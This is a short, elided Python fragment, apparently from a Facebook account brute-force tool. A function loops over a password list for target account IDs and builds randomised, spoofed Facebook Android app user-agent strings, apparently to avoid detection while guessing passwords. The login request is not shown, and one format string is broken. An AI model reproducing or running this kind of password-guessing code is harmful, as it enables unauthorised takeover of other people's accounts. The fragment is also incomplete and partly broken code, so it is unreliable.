...
def ffb2(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				ffb=random.choice(fbks)
				dvlk = random.choice(usr)
				ua_string = '{str(dvlk)} [FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.3,width=1080,height=1462};FBLC/en_US;FBRV/'+fbrv+';FBCR/Globacom Nigeria;FBMF/sony;FBBD/sony;FBPN/com.facebook.katana;FBDV/I4213;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:]'
				li = ['28','29','210']
				li2 = random.choice(li)
				j1 = ''.join(random.choice(digits) for _ in range(2))
				j2 = li2+j1
